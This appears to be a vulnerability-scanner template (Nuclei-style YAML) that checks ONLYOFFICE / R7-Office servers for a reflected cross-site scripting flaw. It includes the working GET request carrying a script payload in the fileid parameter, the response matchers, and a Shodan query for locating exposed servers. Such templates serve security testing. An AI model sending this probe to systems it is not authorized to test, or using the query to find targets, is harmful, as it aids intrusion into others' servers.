http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'Can not convert id: '
    - <script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: r7-xss
info:
  author: haones
  description: 'ONLYOFFICE / R7-Office is an enterprise office server. Versions prior
    to 12.5.2 are subject to a reflected cross-site scripting (XSS) Attack. The vulnerability
    in the application''s web interface could allow an attacker to execute malicious
    javascript code by tricking users into accessing a malicious link.

    '
  metadata:
    max-request: 1
    shodan-query: "title:\"\u04207-\u041E\u0444\u0438\u0441\""
    verified: true
  name: "ONLYOFFICE / \u04207-\u041E\u0444\u0438\u0441 v12.5.2 - Cross-Site Scripting"
  reference:
  - BDU:2023-00142 (temp)
  remediation: Upgrade to the latest version to mitigate this vulnerability.
  severity: high
  tags: "ONLYOFFICE,\u04207-\u041E\u0444\u0438\u0441,xss"
